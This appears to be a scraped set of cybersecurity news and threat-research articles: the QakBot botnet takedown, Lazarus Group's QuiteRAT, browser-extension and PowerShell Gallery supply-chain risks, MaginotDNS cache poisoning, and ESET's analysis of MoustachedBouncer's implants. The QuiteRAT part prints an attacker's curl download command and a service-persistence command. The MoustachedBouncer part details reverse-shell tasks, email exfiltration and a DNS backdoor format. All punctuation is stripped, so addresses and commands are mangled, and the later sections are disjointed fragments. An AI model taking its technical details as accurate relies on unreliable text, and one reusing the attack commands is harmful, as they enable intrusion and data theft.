        "text": "Reporter Infosecurity MagazineThe FBI has led a multinational law enforcement operation that has successfully dismantled QakBot a leading malware loader used by cybercriminals to deploy ransomwareAs part of Operation Duck Hunt the FBI gained access to QakBots admin computers which helped law enforcement map out the server infrastructure used in the botnet's operationIt then seized 52 servers which it said would permanently dismantle the botnet and redirected QakBots traffic to servers controlled by the Bureau pointing victims to download an uninstallerIn an announcement the US Department of Justice DoJ said the FBI had identified more than 700000 infected computers worldwide including more than 200000 in the USThe DoJ also announced it seized over 86m in cryptocurrency from the QakBot cybercriminal organization This money will be returned to the victimsThe operation was carried out in partnership with law enforcement agencies in France Germany the Netherlands Romania Latvia and the UK The technical partners also include the US Cybersecurity and Infrastructure Security Agency CISA Shadowserver Microsoft Digital Crimes Unitandthe National Cyber Forensics and Training Alliance NCFTA Have I Been Pwnedand Zscaler also stepped in to aid in victim notification and remediationIt is described as the largest US-led financial and technical disruption of a botnet infrastructure leveraged by cybercriminals to commit ransomware financial fraud and other cyber-enabled criminal activityDonald Alway the Assistant Director in Charge of the FBIs Los Angeles Field Office said in a statement The Operation Duck Hunt Team utilized their expertise in science and technology but also relied on their ingenuity and passion to identify and cripple QakBot a highly structured and multi-layered bot network that was literally feeding the global cybercrime supply chain These actions will prevent an untold number of cyberattacks at all levels from the compromised personal computer to a catastrophic attack on our critical infrastructureQakBot also known as Quackbot QBot and Pinkslipbot started as a banking trojan in 2008 used to steal banking credentials website cookies and credit cards to conduct financial fraudOver time it evolved into a malware delivery service utilized by other threat actors to gain initial access to networks for conducting ransomware attacks data theft and other malicious cyber activitiesIt primarily infects victim computers through spam email messages containing malicious attachments or hyperlinks Once it has infected a victim's computer QakBot can deliver additional malware including ransomware to the infected computer The ransomware actors then extort their victims seeking ransom payments in bitcoin before returning access to the victim's computer networksIt has been used as an initial means of infection by many prolific ransomware groups in recent years including Conti ProLock Egregor REvil MegaCortex and BlackBastaOperation Duck Hunt investigators have found evidence that between October 2021 and April 2023 QakBot administrators received fees corresponding to approximately 58m in ransoms paid by victimsThe scope of this law enforcement action was limited to information installed on the victim's computers by the QakBot actors It did not extend to remediating other malware already installed on the victim computers and did not involve access to or modification of the information of the owners and users of the infected computersMany cybersecurity professionals across the world lauded the operationDon Smith VP of threat intelligence at the Secureworks Counter Threat Unit CTU which observed 10000 infected machines in 153 countries connected to the QakBot botnet servers said the removal of this significant adversarys infrastructure is to be welcomedRoger Grimes data-driven defense evangelist at cyber awareness training firm KnowBe4 called it wonderful news and praised the FBI for being able to not only take down the QakBot infrastructure but also remove it from infected computersThis sort of proactive cleaning up used to be rare and often contested even by many cybersecurity experts If not done correctly the removal could go badly wrong There have been many instances before the FBI got involved where well-meaning people trying to do proactive clean-up made the situation worse But the FBI and its technical partners appear to be doing the clean-up right with minimal legitimate operational impact I'm glad the FBI and its partners have decided proactive clean-up was worth the risk It improves not only the lives of the exploited people and organizations who have QakBot installed but the next innocent victims he saidJess Parnell VP of security operations at Centripetal said the operation showed that no cyber threat is too small to pay attention to Some might think that a simple spam email or SMS message is harmless but as we are constantly seeing organizations all over the globe are getting hit daily by major cyber-attacks that are oftentimes disguised as something else The dismantling of the QakBot infrastructure serves as a stark reminder that cyber threats are persistent and evolving"

        "text": "In early 2023 we observed Lazarus Group successfully compromise an internet backbone infrastructure provider in Europe to successfully deploy QuiteRAT The actors exploited a vulnerable ManageEngine ServiceDesk instance to gain initial access The successful exploitation triggered the immediate download and execution of a malicious binary via the Java runtime process We observed Lazarus Group use the cURL command to immediately deploy the QuiteRAT binary from a malicious URLcurl hxxp14642194tmptmpcompdat -o cuserspublicnotifyexeThe IP address 14642194 has been used by Lazarus since at least May 2022A successful download of the binary leads to the execution of the QuiteRAT binary by the Java process resulting in the activation of the implant on the infected server Once the implant starts running it sends out preliminary system information to its command and control C2 servers and then waits on the C2 to respond with either a command code to execute or an actual Windows command to execute on the endpoint via a child cmdexe process Some of the initial commands executed by QuiteRAT on the endpoint are for reconnaissanceThere is no in-built persistence mechanism in QuiteRAT Persistence for the implant is achieved via the registry by issuing the following command to QuiteRATCWindowssystem32cmdexe c sc create WindowsNotification type own type interact start auto error ignore binpath cmd K start cuserspublicnotifyexeA typical infection chain looks like thisQuiteRAT is a fairly simple remote access trojan RAT It consists of a compact set of statically linked Qt libraries along with some user-written code The Qt framework is a platform for developing cross-platform applications However it is immensely popular for developing Graphical User Interface in applications Although QuiteRAT just like MagicRAT uses embedded Qt libraries none of these implants have a Graphical User Interface As seen with Lazarus Groups MagicRAT malware the use of Qt increases the code complexity making human analysis harder Using Qt also makes machine learning and heuristic analysis detection less reliable since Qt is rarely used in malware developmentThe implant initially gathers some rudimentary information about the infected endpoint including MAC addresses IP addresses and the current user name of the device This information is then arranged in the formatMACaddressIPaddress0MACaddressIPaddress1MACaddressIPaddressnusernameThe resulting string is then used to calculate an MD4 hash which is then used as the infection identifier victim identifier while conversing with the C2 serverThe URL to communicate with the C2 is constructed as follows with the following extended URI parametersThe URL for the HTTP GET to obtain inputs from the C2 looks like thisC2URLmailid12charsMD4actioninboxparamInternalLocalIPaddresssessionrandData is also sent to the C2 using the HTTP GET VERB as well The URL for the HTTP GET to send data to the C2 looks like thisC2URLmailid12charsMD4actionsentbodybase64xorreddataparamInternalLocalIPaddresssessionrandAny data sent to the C2 is utmost 0x400 1024 bytes in length If the output of a command executed on the endpoint by the implant is larger than 1024 bytes the implant appends the No Pineapple marker at the end of the dataThe User-Agent used during communications by the implant isMozilla50 Windows NT 100 Win64 x64 rv1000 Gecko20100101 Firefox1000The malware also has the ability to run a ping command on a random IP address that it generates on the fly The request is usually executed using the command compspecpathcmdexe c IPAddress -n 18 The implant can also receive a command code sendmail along with a numeric value from the C2 server This value is then used by the implant to Sleep for a specific period of time in minutes before it begins talking to the C2 server again The adversaries likely use this functionality to keep the implant dormant for longer periods of time while ensuring continued access to the compromised enterprise network The implant also has the ability to receive a second URL from the current C2 server via the command code receivemail The implant will then reach out to the second URL to receive commands and payloads from the server to execute on the infected systemWe have seen the following versions of QuiteRAT in the wild We are only able to share one of the file hashes at this time which is included in the IOCs sectionThe latest version of Lazarus Groups older MagicRAT implant observed in the wild was compiled in April 2022 This is the last version of MagicRAT that we know of The use of MagicRATs derivative implant QuiteRAT beginning in May 2023 suggests the actor is changing tactics opting for a smaller more compact Qt-based implantQuiteRAT is clearly an evolution of MagicRAT While MagicRAT is a bigger bulkier malware family averaging around 18MB in size QuiteRAT is a much much smaller implementation averaging around 4 to 5MB in size This substantial difference in size is due to Lazarus Group incorporating only a handful of required Qt libraries into QuiteRAT as opposed to MagicRAT in which they embedded the entire Qt framework Furthermore while MagicRAT consists of persistence mechanisms implemented in it via the ability to set up scheduled tasks QuiteRAT does not have a persistence capability and needs to be issued one by the C2 server to achieve continued operation on the infected endpoint This is another contributing factor to the smaller size of QuiteRATThere are similarities between the implants that indicate that QuiteRAT is a derivative of MagicRAT Apart from being built on the Qt framework both implants consist of the same abilities including running arbitrary commands on the infected system Both implants also use base64 encoding to obfuscate their strings with an additional measure such as XOR or prepending hardcoded data to make it difficult to decode the strings automatically Additionally both implants use similar functionality to allow them to remain dormant on the endpoint by specifying a sleep period for them by the C2 serverWays our customers can detect and block this threat are listed

        "text": "Many browser extensions that organizations permit employees to use when working with software-as-a-service SaaS apps such as Google Workspace and Microsoft 365 have access to high levels of content and present risks such as data theft and compliance issues a new study has foundResearchers at SpinAI recently conducted a risk assessment on some 300000 browser extensions and third-party OAuth applications in use within enterprise environments The focus was on Chromium-based browser extensions across multiple browsers such as Google's Chrome and Microsoft's EdgeThe study showed 51 of all installed extensions were high risk and had the potential to cause extensive damage to the organizations using them The extensions all had the ability to capture sensitive data from enterprise apps run malicious JavaScript and surreptitiously send protected data including banking details and login credentials to external partiesThe main takeaway for organizations from this report is the significant cybersecurity risks associated with browser extensions says Davit Asatryan one of the authors of a report released this week These extensions while offering various features to enhance user experience and productivity can pose serious threats to data stored in browsers such as Chrome and Edge or SaaS data stored in platforms like Google Workspace and Microsoft 365 he saysGoogle quickly removed the weaponized extension from its official Chrome Store But that has not stopped others from freely uploading other ChatGPT extensions to the same store Spin found more than 200 ChatGPT extensions on the Chrome webstore in August compared with just 11 in MaySpin's analysis showed that organizations with over 2000 employees have an average of 1454 installed extensions The most common among these were productivity-related extensions tools that helped developers and extensions that enabled better accessibility More than one-third 35 of these extensions presented a high risk compared with 27 in organizations with fewer than 2000 employeesOne startling takeaway from Spin's report is the relatively high number of browser extensions 42938 with anonymous authors that organizations appear to be freely using without considering any potential security pitfalls The statistic is especially concerning given how easily anyone with malicious intent can publish an extension says Asatryan Making matters worse is the fact that in some cases the browser extensions that organizations are using were sourced from outside of an official marketplaceCompanies also sometimes build their own extensions for internal use and upload them Asatryan says However this may introduce additional risk as extensions from these sources might not go through the same level of scrutiny and security checks as those available in official storesSpin found that browsers can be bad from inception or sometimes acquire malicious qualities via automatic updates That can happen when an attacker infiltrates an organization's supply chain and inserts malicious code into a legitimate update Developers can also sell their extensions to other third parties that might then update it with malicious capabilitiesAnother factor that organizations need to consider is how a browser extension might use its permissions to behave in unexpected ways For example an extension could obtain 'identity' permission and then use the 'webrequest' permission to send this information to a third party Asatryan saysIt's important for organizations to establish and enforce policies based on third-party risk management frameworks he notes They need to assess extensions and applications for operational security privacy and compliance risks and consider implementing automated controls that allow or block extensions based on organizational policiesWe recommend that organizations evaluate browser extensions before installing them by considering factors such as the scope of permissions requested by the extension the developer's reputation and disclosure of security or compliance audits Asatryan says Regular updates and maintenance are important as are user reviews and ratings as well as any history of data breaches or security incidentsCopyright 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place London SW1P 1WG"

        "title": "PowerShell Gallery Prone to Typosquatting Other Supply Chain Attacks",
        "text": "Editor's Note This article was updated on 8182023 with a response received from MicrosoftMicrosoft's PowerShell Gallery presents a software supply chain risk because of its relatively weak protections against attackers who want to upload malicious packages to the online repository according to researchers at Aqua NautilusThey recently tested the repository's policies regarding package names and owners and found that a threat actor could easily abuse them to spoof legitimate packages and make it hard for users to identify the true owner of a packageIf your organization uses PowerShell modules from the gallery we suggest only using signed PowerShell modules utilizing trusted private repositories and exercising caution when downloading new modulesscripts from registries says Yakir Kadkoda lead security researcher at Aqua Second we advise similar platforms to the PowerShell Gallery to take necessary steps to enhance their security measures For instance they should implement a mechanism that prevents developers from uploading modules with names too similar to existing onesKadkoda says Microsoft acknowledged the issues when informed about them and claimed it had addressed two separate issues once inFebruary2022and a second time this past January However we've continued to check and these issues still exist as of Aug 16 he saysMicrosoft said it added functions to find and eradicate malicious packages We're aware of this report and have determined that it relies on social engineering to be successful However we've implemented some changes to help identify and remove these packages a Microsoft spokeswoman said in an emailed statement to Dark Reading after this story was published We encourage users to report any packages they suspect are malicious via the Report link on the package moduleMicrosoft said it will continue to monitor for malicious activity on PowerShell Galleryand take defense-in-depth measures to keep customers protectedPowerShell Gallery is a widely used repository for finding publishing and sharing PowerShell code modules and so-called desired state configuration DSC resources Many of the packages on the registry are from trusted entities such as Microsoft AWS and VMware while many others are from community members There have been more than 16 billion package downloads from the repository so far this year aloneOne issue that Aqua discovered was the lack of any kind of protection against typosquatting a deception technique that threat actors have increasingly used in recent years to trick users into downloading malicious packages from public software repositories Typosquatters typically use names that are phonetically similar to names of popular and legitimate packages on public repositories such as npm PyPI and Maven They then rely on users making typos when searching for these packages and downloading their malicious package instead The technique has become a common software supply chain attack vectorAqua found PowerShell Gallery's policies did little to protect against such deception For instance the names of most Azure packages on the repository followed a specific pattern namely AzpackagenameHowever some other very popular Azure packages such as Aztable did not follow the pattern and did not have a dot in the name Aqua found that there are no restrictions on the prefixes that package developers can use when naming their packages For example when Aqua's researchers crafted a nearly perfect replica of Aztable and labeled it AzTable they had no problem uploading the proof-of-concept PoC code to PowerShell Gallery Callback code that Aqua included in the PoC showed that several hosts across various cloud services had downloaded the package in the first few hours aloneIn our opinion other registries have more protective measures Kadkoda says For instance npm another registry platform by Microsoft uses 'Moniker' rules specifically designed to combat typosquatting he says One example Since a package named react-native already exists on npm no one labels their module with variation such as reactnative reactnative or reactnativeAnother problem that Aqua uncovered with PowerShell Gallery's policies is how they allowed a threat actor to make a malicious package appear legitimate by faking crucial details such as the Authors Description and Copyright fields An attacker can freely choose any name when creating a user in the PowerShell Gallery Aqua said in its blog post Therefore determining the actual author of a PowerShell module in the PowerShell Gallery poses a challenging taskUnsuspecting users who find these packages on PowerShell Gallery can easily be deceived into believing that the author of the malicious package is a legitimate entity such as Microsoft Aqua saidIn addition Aqua's analysis showed that one API in PowerShell Gallery's basically gave threat actors a way to find unlisted modules on the registry and potentially any sensitive data associated with those modules Typically an unlisted module is private and should not be something that an attacker would be able to find via a search of the repository Aqua researchers found they could not only pull up such modules they also found one that contained sensitive secrets that belonged to a large technology companyKadkoda says there is no evidence to suggested that threat actors have leveraged these weaknesses to sneak malicious package into PowerShell Gallery However the threat is real It's important to note that according to Microsoft they scan PowerShell modulesscripts uploaded to the gallery Kadkoda says This is a good measure to block malicious uploads However it remains a cat-and-mouse game between Microsoft's solution and

        "text": "A team of researchers from UC Irvine and Tsinghua University has developed a new powerful cache poisoning attack named 'MaginotDNS' that targets Conditional DNS CDNS resolvers and can compromise entire TLDs top-level domainsThe attack is made possible thanks to inconsistencies in implementing security checks in different DNS software and server modes recursive resolvers and forwarders leaving roughly one-third of all CDNS servers vulnerableDNS Domain Name System is a hierarchical and distributed naming system for internet resources and networks helping resolve human-readable domain names to numerical IP addresses so that a network connection can be madeThe DNS resolution process uses UDP TCP and DNSSEC to perform queries and receive responses It can be iterative and recursive involving multiple steps and exchanges with root servers TLD servers authoritative servers caching records along the way etcThe concept of DNS cache poisoning is injecting forged answers into the DNS resolver cache causing the server to direct users who enter a domain to incorrect IP addresses potentially leading them to malicious websites without their knowledgeMany attacks of this type have been demonstrated in the past like for example the Kashpureff Attack in 1997 which exploited a lack of data verification bailiwick rules and the Kaminsky Attack in 2008 that took advantage of the absence of a source port randomization systemThese attacks have been mitigated by adding defenses into the resolvers' implementation rendering off-path attacks challengingHowever the 'MaginotDNS' attack can overcome these defenses by attacking the forwarding mode of CDNS from either on-path or off-pathCDNS resolvers support both recursive and forwarding query modes used by ISPs and the enterprise to reduce costs and better access controlThe researchers found that bailiwick checks are adequately enforced in the recursive mode however the forwarder is vulnerableBecause the two share the same global DNS cache an attack on the forwarder mode can open the path to breaching the recursive mode essentially breaking the DNS cache protection boundaryIn certain cases they noted configurations that treated all records as if they were under the root domain a highly vulnerable setupThe examples showcased by the researchers during their BlackHat presentation include both on-path and off-path attacks with the latter being the more complicated but also far more valuable for threat actorsFor these attacks the threat actor needs to predict the source port and the transaction ID used by the target's recursive DNS servers when generating a request and then use a malicious DNS server to send forged responses with the correct parametersInferring the source port and guessing the transaction IDs can be done by brute forcing or using SADDNS side-channel attacked DNSFor BIND9 both parameters can be successfully retrieved after 3600 query rounds while for Microsoft DNS this drops to 720 roundsTo increase the chances of success the attacker must control the reply time of the malicious DNS responses to ensure their forged response reaches the victim's server before the legitimate oneThe researchers shared the following video demonstrating theMaginotDNS attack on Microsoft DNSThe researchers scanned the internet and found 1200000 DNS resolvers of which 154955 are CDNS serversNext using software fingerprints to identify vulnerable versions they found 54949 vulnerable CDNS servers all of which are susceptible to on-path attacks and 883 are impacted by off-path attacksAll the affected software vendors mentioned above have confirmed and fixed the flaws and Microsoft has awarded a bounty to the researchers for their reportHowever for the issues to be fully mitigated CDNS administrators must apply the patches and follow the correct configuration guidelines provided by the vendors"

group's intricate tactics techniques and procedures were also discussed on the ESET Research Podcast Just press play to learn more from ESET's Director of Threat Research Jean-Ian Boutin and ESET Distinguished Researcher Aryeh GoretskyAccording to ESET telemetry the group targets foreign embassies in Belarus and we have identified four different countries whose embassy staff have been targeted two from Europe one from South Asia and one from Africa The key dates are shown in Figure 1MoustachedBouncers activity spans from 2014 to 2022 and the TTPs of the group have evolved over time For

section we detail the initial access for Disco We dont yet know the initial access method MoustachedBouncer uses to install NightClubNote that it is using unencrypted HTTP and not HTTPS and that the updatesmicrosoftcom subdomain does not exist on Microsofts nameservers so it does not resolve on the open internet During the attack this domain resolved to 545121106 on the targets machine This IP address is used for parking domains and is unrelated to Microsoft Although this is an internet-routable IP address traffic to this IP never reaches the internet while the AitM attack is ongoing Both the DNS resolutions and the HTTP replies were injected in transit probably at the ISP levelAn important point is that the adversary-in-the-middle AitM technique only occurs against a few selected organizations perhaps just embassies not countrywide It is not possible to reproduce the redirection by simply exiting from a random IP address in BelarusThe HTML page shown in Figure 2 loads JavaScript code from httpupdatesmicrosoftcomjdropjs This script first calls setTimeout to execute the function jdrop one second after the page has loaded That function see Figure 3 displays a modal window with a button named translation Get updatesA click on the button executes the update function shown in Figure 4This function triggers the download of a fake Windows Update installer from the legitimate-seeming URL httpupdatesmicrosoftcomMicrosoftUpdate845255zip It also displays some instructions to install the update MicrosoftUpdate845255msi translation To install updates download and run MicrosoftUpdate845255msiWe were unable to retrieve the downloaded MicrosoftUpdate845255zip file but our telemetry shows it contains a malicious executable named MicrosoftUpdate845255exeWritten in Go it creates a scheduled task that executes 35214562OfficeBrokerOfficeBrokerexe every minute Like the path suggests it fetches the executable via SMB from 35214562 This IP address belongs to a Google Cloud customer but just like the HTTP server we believe that SMB replies are injected on the fly via AitM and that the attackers dont control the actual internet-routable IP addressWe have also observed the following SMB servers intercepted via AitMWe have observed this behavior in two separate ISP networks Unitary Enterprise A1 and Beltelecom This suggests that those ISPs may not provide full data confidentiality and integrity We strongly recommend that foreign organizations in Belarus use an end-to-end encrypted VPN tunnel ideally out-of-band ie not from the endpoint providing internet connectivity from a trusted networkFigure 5 depicts our hypothesis about the compromise vector and the traffic interceptionThe AitM scenario reminds us of the Turla and StrongPity threat actors who have trojanized software installers on the fly at the ISP levelUsually this initial access method is used by threat actors operating in their own country because it requires significant access inside the internet service providers or their upstream providers In many countries security services are allowed to perform so-called lawful interception using special devices installed on the ISPs premisesIn 2018 the Citizen Lab revealed that DPI devices developed by the Canadian company Sandvine were used to modify HTTP traffic in Turkey and Egypt In Turkey the devices were allegedly used to redirect internet users to a malicious server when they tried to download certain Windows applications which is in line with StrongPity activities In Egypt those devices were allegedly used to inject ads and cryptocurrency mining scripts in order to generate moneyWhile the compromise of routers in order to conduct AitM on embassy networks cannot be fully discarded the presence of lawful interception capabilities in Belarus suggests the traffic mangling is happening at the ISP level rather than on the targets routersSince 2014 the malware families used by MoustachedBouncer have evolved and a big change happened in 2020 when the group started to use AitM attacks At the same time it started to use much simpler tools developed in NET and Go In reference to NightClub we named this new toolset DiscoMoustachedBouncer operates the two implant families in parallel but on a given machine only one is deployed at a time We believe that Disco is used in conjunction with AitM attacks while NightClub is used for victims where traffic interception at the ISP level isnt possible because of a mitigation such as the use of an end-to-end encrypted VPN where internet traffic is routed outside of BelarusAs mentioned in the previous section a fake Windows Update page delivers the first stage SHA-1 E65EB4467DDB1C99B09AE87BA0A964C36BAB4C30 This is a simple dropper written in Go that creates a scheduled task to execute 35214562OfficeBrokerOfficeBrokerexe every minute OfficeBrokerexe is downloaded over the SMB protocol via AitM attack The droppers main function is shown in Figure 6Finally the dropper does a DNS query for windowssystemupdatecom This domain does not exist but the DNS request is probably intercepted via AitM and is likely a beacon to notify the operators that the machine has been successfully compromisedWe were unable to retrieve the OfficeBrokerexe file but it is very likely that it acts as a downloader since we have observed further plugins being executed from SMB shares The plugins are developed in Go and are rather simple because they mostly rely on external Go libraries Table 2 summarizes the different pluginsDownload URL Path on

also seems to be no way to reach that CC server from the internet This gives high resiliency to the attackers network infrastructureIn January 2020 we observed a MoustachedBouncer dropper which we named SharpDisco being downloaded from httpsmailmfagovredactedEdgeUpdateexe by a Microsoft Edge process It is not clear how attackers were able to tamper with HTTPS traffic but it is possible an invalid TLS certificate warning was shown to the victim Another possibility is that MoustachedBouncer compromised this governmental websiteSharpDisco is a dropper developed in C It displays a fake update window shown in Figure 7 while creating two scheduled tasks in the backgroundThese scheduled tasks areWINCMDAEXE and WINCMDBEXE are probably just cmdexe renamed Every minute the task reads what is in 2495194EDGEUPDATEEDGEAIN on the SMB share pipes it to cmdexe and writes the output to 2495194EDGEUPDATEEDGEAOUT It is the same for the second task but with the EDGEBIN and EDGEBOUT files From a higher viewpoint those tasks are reverse shells with a one-second latencyThen as shown in Figure 8 the dropper sends a DNS request for an unregistered domain edgeupdate-security-windowscom This is similar to what the 2022 Disco dropper doesESET telemetry shows that the reverse shell was used to drop a genuine Python interpreter in CUsersPublicWinTNWinTNexe We then observed two plugins being dropped on disk by cmdexe which means they were likely dropped by the reverse shell as well The two plugins areIt is interesting to note that those plugins share code with NightClub described in the section NightClub 2017 SHA-1 F92FE4DD679903F75ADE64DC8A20D46DFBD3B277 below This allowed us to link the Disco and NightClub toolsetsThis plugin is a Windows executable named It11exe We believe it was executed via the reverse shell mentioned above There is no persistence mechanism implemented in the pluginIt gets the files recently opened on the machine by reading the content of the folder USERPROFILERecent on Windows XP or of APPDATAMicrosoftWindowsRecent in newer Windows versions Those folders contain LNK files each pointing to a recently opened fileThe plugin embeds its own LNK format parser in order to extract the path to the original fileWe were unable to make this plugin work but static analysis shows that the files are exfiltrated to the SMB share 2495194EDGEUPDATEupdate The plugin maintains a list of already exfiltrated files and their CRC-32 checksum in TEMPindexdat This likely avoids retransmitting the same file more than onceThis plugin is a Windows executable named It3exe As with the recent-files stealer it doesnt implement any persistence mechanismThe plugin calls GetLogicalDrives in a loop to get a list of all connected drives including removable ones such as USB keys Then it does a raw copy of the NTFS volume of each removable drive and writes it in the current working directory CUsersPublic in our example The filename is a randomly generated string of six to eight alphanumeric characters for example heNNYwmYIt maintains a log file in working directoryindexdat with the CRC-32 checksums of the copied disksThe plugin doesnt appear to have any exfiltration capabilities It is likely that the staged drive dumps are later retrieved using the reverse shellSince 2014 MoustachedBouncer has been using a malware framework we named NightClub because it contains a C class named nightclub We found samples from 2014 2017 2020 and 2022 This section describes the evolution of NightClub from a simple backdoor to a fully modular C implantIn summary NightClub is an implant family using emails for its CC communications Since 2016 additional modules could be delivered by email to extend its spying capabilitiesThis is the oldest known version of NightClub We found a dropper and an orchestratorThe dropper SHA-1 0401EE7F3BC384734BF7E352C4C4BC372840C30D is an executable named EsetUpdate-0117583943exe and it was uploaded to VirusTotal from Ukraine on 2014-11-19 We dont know how it was distributed at that timeThe main function illustrated in Figure 9 loads the resource MEMORY and writes its content in SystemRootSystem32crehdll It is stored in cleartext in the PE resourceThen the dropper modifies the Creation Access and Write timestamps of crehdll to those of the genuine Windows DLL user32dllFinally it creates a Windows service named WmdmPmSp and sets in the registry its ServiceDll to SystemRootSystem32crehdll see Figure 10The previously dropped DLL crehdll SHA-1 5B55250CC0DA407201B5F042322CFDBF56041632 is the NightClub orchestrator It has a single export named ServiceMain and its PDB path is DProgrammingProjectsWorkSwampThingReleaseWin32WorkingDllpdbIt is written in C and the names of some methods and classes are present in the RTTI data see Figure 11Some of the strings are encrypted using the following linear congruential generator LCG staten1 690069 staten 1 mod 232 For each encrypted string a seed state0 between 0 and 255 is provided To decrypt a string the staten is subtracted from each encrypted byten An example of an encrypted string structure is shown in Figure 12A non-encrypted log file is present in CWindowsSystem32servdlllog It contains very basic information about the initialization of the orchestrator see Figure 13NightClub has two main capabilities Monitoring files Exfiltrating data via SMTP emailFunctionality implemented here is very close to that of the recent file monitor plugin seen in 2020 and described above It also browses the directories USERPROFILERecent on Windows XP and in newer Windows versions APPDATAMicrosoftWindowsRecent and implements the same LNK parser see Figure 14 and Figure 15The files retrieved from the LNK files are copied to TEMPoriginal filenamebin Note that unlike the 2020 variant only files with extensions doc docx xls xslx or pdf are copiedIt also monitors removable drives in a loop in order to steal files from them SMTP server smtpseznamcz Sender address glenmorriss75seznamcz Sender password redacted Recipient address SunyaFseznamczseznamcz is a Czech web portal offering a free webmail service We believe the attackers created their own email accounts instead of compromising legitimate onesNightClub exfiltrates the files previously copied to TEMP by the file monitor functionality FileMonitor in Figure 11 Theyre encoded in base64 and added as an attachment The attachment name is the original filename with the bin extensionFigure 16 shows the exfiltration of a file via SMTP NightClub authenticates using the credentials for the glenmorriss75seznamcz account and sends an email to SunyaFseznamcz with the stolen file attachedNote that some headers that might look suspicious at first sight are the defaults from the CSmtp project so they are probably not distinctive These include X-Mailer The Bat v302 Professional Content-Type multipartmixed boundaryMESSAGEID54yg6f6h6y456345The Bat is an email client widely used in Eastern Europe As such the X-Mailer header likely blends in with email traffic in BelarusIn 2017 we found a more recent version of NightClub which was compiled on 2017-06-05 On the victims machine it was located at CWindowsSystem32metamndll Its filename in the DLL export directory is DownloaderServicedll and it has a single export named ServiceMain It contains the PDB path DAbcdMainProjectRootsrcProjectsMainSInkReleasex64EtfFavoriteFinderpdbTo persist it creates a Windows service named WmdmPmSp as in previous versions Unfortunately we have not been able to recover the dropperThis NightClub version also includes a few C class and method names including nightclub in the RTTI data see Figure 17As in previous versions CC communications use the SMTP protocol via the CSmtp library with hardcoded credentials In the sample we analyzed the mail configuration is SMTP server smtpmailru Sender address fhtgbbwimailru Sender password redacted Recipient address nvjfnvjfnjfmailruThe main difference is that they switched the free email provider from Seznamcz to MailruThis NightClub version uses external plugins stored in the folder APPDATANvmFilter They are DLLs named randomcr eg et2z7q0FREZcr with a single export named Starts We have identified two plugins a keylogger and a file monitorThis plugin was stored in APPDATANvmFilteret2z7q0FREZcr and is a DLL with one export Starts It contains the PDB path DProgrammingProjectsAutogenKhAutogenAlgReleasex64SearchIdxDllpdb and was developed in C RTTI data shows a few class names see Figure 18The keylogger implementation is rather traditional using the Windows GetKeyState API function see Figure 19The keylogger maintains a cleartext log file in TEMPuirtltmp It contains the date the title of the application and the logged keystrokes for this specific application An example which we generated is provided in Figure 20This plugin was stored in APPDATANvmFiltersTUlsWa1cr and is a DLL with a single export named Starts Its PDB path DProgrammingProjectsAutogenKhAutogenAlgReleasex64FileMonitoringModulepdb has not been stripped and it reuses code from the 2014 and 2020 file monitors described above It monitors drives and recent files and copies files for exfiltration to TEMPAcmSymrm Its log file is stored in TEMPindexwtisxdIn 2020-11 we observed a new version of NightClub deployed in Belarus on the computers of the diplomatic staff of a European country In 2022-07 MoustachedBouncer again compromised some of the same computers The 2020 and 2022 versions of NightClub are almost identical and the compromise vector remains unknownIts architecture is slightly different from the previous versions as the orchestrator also implements networking functions The second component which its developers call the module agent is only responsible for loading the plugins All samples were found in the folder APPDATAmicrosoftdef and are written in C with statically linked libraries such as CSmtp or cpprestsdk As a result the executables are quite large around 5MBOn the victims machines both orchestrator variants SHA-1 92115E21E565440B1A26ECC20D2552A214155669 and D14D9118335C9BF6633CB2A41023486DACBEB052 were named svhvostexe We believe MoustachedBouncer tried to masquerade as the name of the legitimate executable svchostexe For persistence it creates a service named vAwastThe config is formatted in JSON as shown in Figure 22The most important keys are transport and modules The former contains information about the mailbox used for CC communications as in the previous versions The latter contains the list of modulesThe two variants of the module agent SHA-1 DE0B38E12C0AF0FD63A67B03DD1F8C1BF7FA6128 and E6DE72516C1D4338D7E45E028340B54DCDC7A8AC were named schvostexe which is another imitation of the svchostexe filenameThis component is responsible for starting the modules that are specified in the configuration They are DLLs each with an export named Start or Starts They are stored on disk unencrypted with the ini extension but actually are DLLsOver the course of our investigation we found five different modules an audio recorder two almost identical screenshotters a keylogger and a DNS backdoor For all of them their configuration which is formatted in JSON is passed as an argument to the Start or Starts functionBy default the output of the plugin is written in TEMPtmp123tmp This can be changed using the config field file Table 3 shows the different pluginsTable 3 NightClub pluginsDLL export

adds the data to exfiltrate as part of the subdomain name of the domain that is used in the DNS request pszName above The domain is always 1111cid and the data is contained in the subdomain It uses the following format where x is the letter not some variablex modified base64buffer x1111cidFor example the first DNS request the plugin sends is xZW1wdHkx1111cid where ZW1wdHk decodes to emptyNote that the base64 function is not standard It removes the if any from the result of the base64 encoding and also replaces characters with -s and characters with -p This is to create valid subdomains because standard base64 encoding output can include and characters all of which are invalid in domain names and could be detected in network trafficFigure 24 The plugin reads the TXT recordThe expected format of the reply isx argument encoded with modified base64 xcmdidunknown integer1cmdnameThis is similar to the format of the requests The argument encoded with modified base64 also uses the custom base64 encoding without and with -p for and -s for cmdname is an arbitrary string that is not used by the backdoor its likely used by the operators to keep track of the different commands cmdid is an integer that corresponds to a command in the backdoor switch statementFor example if the operators wanted to execute calcexe the DNS CC server would send the reply xYzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQx2721calc where Yzpcd2luZG93c1xzeXN0ZW0zMlxjYWxjLmV4ZQ decodes to cwindowssystem32calcexe and 27 is the command ID to create a new process All commands supported by this backdoor are detailed in Table 4Table 4 Commands implemented by the DNS backdoorIDDescription0x15 21Copy a directory from a source to a destination0x16 22Move a file from a source to a

timeout to the CC serverMoustachedBouncer is a skilled threat actor targeting foreign diplomats in Belarus It uses quite advanced techniques for CC communications including network interception at the ISP level for the Disco implant emails for the NightClub implant and DNS in one of the NightClub pluginsThe main takeaway is that organizations in foreign countries where the internet cannot be trusted should use an end-to-end encrypted VPN tunnel to a trusted location for all their internet traffic in order to circumvent any network inspection

